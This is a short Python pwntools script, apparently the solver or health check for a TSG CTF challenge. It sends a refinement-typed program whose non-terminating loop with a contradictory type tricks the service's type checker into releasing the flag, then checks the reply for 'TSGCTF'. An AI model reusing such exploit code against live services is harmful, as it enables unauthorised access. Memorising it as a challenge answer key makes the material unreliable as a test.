from pwn import *
import sys

host = sys.argv[1]
port = int(sys.argv[2])

io = remote(host, port)

s = r"""
let rec loop:: x::Integer{1>0} -> Dv(x::Integer{0>1}) = \x -> loop x in
  let n = loop 1 in
  flag 1
__EOF__
"""

io.sendline(s.encode("ascii"))
flag = io.recv()
print(flag)

if b"TSGCTF" in flag:
    exit(0)
else:
    exit(1)
